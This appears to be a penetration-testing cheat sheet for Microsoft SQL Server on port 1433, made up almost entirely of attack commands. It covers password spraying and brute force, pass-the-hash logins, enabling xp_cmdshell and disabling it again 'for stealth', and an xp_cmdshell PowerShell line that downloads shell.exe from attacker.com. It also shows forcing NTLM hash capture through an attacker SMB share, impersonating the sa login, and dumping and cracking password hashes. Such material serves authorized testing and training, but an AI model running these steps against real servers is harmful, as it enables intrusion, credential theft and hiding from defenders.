# MSSQL / Microsoft SQL Server — TCP/1433

## Detection

### nmap
```
nmap -p 1433 -sV <IP>
nmap -p 1433 --script ms-sql-info <IP>
nmap -p 1433 --script ms-sql-ntlm-info <IP>
```

## Banner Grabbing

### netcat
```
nc -nv target.com 1433
```

### nmap
```
nmap -p 1433 -sV --script-args mssql.instance-all target.com
```

## MSSQL Instance Discovery

### nmap (SQL Server Browser Service (UDP 1434))
```
nmap -sU -p 1434 --script ms-sql-discover target.com
```

### Metasploit
```
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS target.com
run
```

## Authentication Testing

### Credential Validation
```
crackmapexec mssql <IP> -u users.txt -p passwords.txt
```

### Password Spray
```
crackmapexec mssql <IP> -u users.txt -p 'Winter2024!'
```

### Brute Force
```
hydra -L users.txt -P passwords.txt <IP> mssql
```

## Connect

### impacket-mssqlclient.py 

#### Windows authentication
```
impacket-mssqlclient DOMAIN/username:password@target.com -windows-auth
```
#### SQL authentication
```
impacket-mssqlclient sa:password@target.com
```
#### With specific database
```
impacket-mssqlclient username:password@target.com -db master
```
#### Using hash (Pass-the-Hash)
```
impacket-mssqlclient username@target.com -hashes :NTHASH
```

### sqsh
#### Connect with SQL authentication
```
sqsh -S target.com -U sa -P password
```
#### Connect with Windows authentication
```
sqsh -S target.com -U DOMAIN\\username -P password
```

## In-Database Enumeration

### Version Detection
#### Get SQL Server version
```
SELECT @@version;
```

#### Get Product version
```
SELECT SERVERPROPERTY('ProductVersion');
SELECT SERVERPROPERTY('ProductLevel');
SELECT SERVERPROPERTY('Edition');
```

#### Get Machine name
```
SELECT @@SERVERNAME;
SELECT SERVERPROPERTY('MachineName');
```


### List databases
```
SELECT name FROM sys.databases;
SELECT name FROM master.dbo.sysdatabases;
```

### Current Database
```
SELECT DB_NAME();
```

### Database Information
```
SELECT name, database_id, create_date 
FROM sys.databases;
```

### Switch database
```
USE master;
```

### User Enumeration

#### List All Users
```
SELECT name FROM master.sys.server_principals;
SELECT name FROM sys.sysusers;
```

#### Current User
```
SELECT USER_NAME();
SELECT SYSTEM_USER;
SELECT CURRENT_USER;
```

#### User Privileges
```
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

#### List Sysadmin Users
```
SELECT name FROM master.sys.server_principals 
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
```

### Table And Column Enumeration

#### List tables in current database
```
SELECT table_name FROM information_schema.tables;
```

#### List all columns in a table
```
SELECT column_name, data_type 
FROM information_schema.columns 
WHERE table_name = 'users';
```

#### Search for specific column names
```
SELECT table_name, column_name 
FROM information_schema.columns 
WHERE column_name LIKE '%password%';
```

#### Count rows in tables
```
SELECT t.name, p.rows 
FROM sys.tables t
INNER JOIN sys.partitions p ON t.object_id = p.object_id
WHERE p.index_id < 2
```

### Privilege Enumeration

#### Identify login context
```
SELECT SYSTEM_USER;
SELECT USER_NAME();
```

#### Check if current user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin');
```
- `1` = sysadmin
- `0` = not sysadmin


#### Check server roles
```
SELECT name FROM master.sys.server_principals 
WHERE type = 'R';
```

#### Database role members
```
EXEC sp_helprolemember;
```

### Linked Server Enumeration
#### List linked servers
```
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
```
#### Test linked server connection
```
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT @@version');
```
#### Execute on linked server
```
EXEC ('SELECT @@version') AT [LinkedServerName];
```


## Attack Vectors
 
### Default Credentials (try with impacket-mssqlclient)
```
sa:<blank>
sa:sa
sa:password
sa:Password123
sa:P@ssw0rd
```

### Brute Force Attack

#### hydra
```
hydra -l sa -P /usr/share/wordlists/rockyou.txt target.com mssql
```

#### Metasploit
```
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

#### nmap
```
nmap -p 1433 --script ms-sql-brute \
  --script-args userdb=users.txt,passdb=passwords.txt target.com
```

## High-Value Abuse Paths
### xp_cmdshell (OS Command Execution)

#### Enable xp_cmdshell
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### Execute Commands
```
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';
```

#### Disable xp_cmdshell (for stealth)
```
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

### Reading Files

#### xp_cmdshell (read file)
```
EXEC xp_cmdshell 'type C:\Windows\win.ini';
```

#### xp_dirtree (list directories)
```
EXEC master..xp_dirtree 'C:\', 1, 1;
```

#### xp_fileexist (check file existence)
```
EXEC master..xp_fileexist 'C:\Windows\win.ini';
```

#### OPENROWSET
```
SELECT * FROM OPENROWSET(
  BULK 'C:\Windows\System32\drivers\etc\hosts',
  SINGLE_CLOB
) AS contents;
```

### Writing Files

### Basic File Writing
#### Write new file

```
EXEC xp_cmdshell 'echo test > C:\Temp\test.txt';
```
#### Copy file
```
EXEC xp_cmdshell 'copy C:\source.txt C:\dest.txt';
```

#### Download file from web
```
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\Temp\shell.exe"';
```

#### BCP utlitiy to export data
```
EXEC master..xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout "C:\users.txt" -c -T';
```

## Capturing MSSQL Service Hash
### Setting up Hash Capture
```
# Force MSSQL to authenticate to attacker's SMB share
# Start Responder on attacker machine
sudo responder -I eth0

# On MSSQL
EXEC xp_dirtree '\\attacker-ip\share';
EXEC xp_fileexist '\\attacker-ip\share\file';

# Or using xp_subdirs
EXEC master..xp_subdirs '\\attacker-ip\share';
```
### Hash Cracking 
```
# Capture NTLMv2 hash with Responder
# Crack with hashcat
hashcat -m 5600 hash.txt rockyou.txt
```

## Privilege Escalation

### Impersonation Attacks

#### Check for impersonation permissions
```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

#### Impersonate sysadmin user
```
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

#### Execute as different user
```
EXECUTE AS USER = 'admin_user';
```

#### Revert to original context
```
REVERT;
```

## Post-Exploitation
### Hash Extraction
```
SELECT name,password_hash FROM sys.sql_logins
SELECT name,password FROM users;
```

### Metasploit
```
# Using Metasploit
use auxiliary/scanner/mssql/mssql_hashdump
set RHOSTS target.com
set USERNAME sa
set PASSWORD password
run
```
### Crack MSSQL hashes
```
hashcat -m 1731 hashes.txt rockyou.txt
```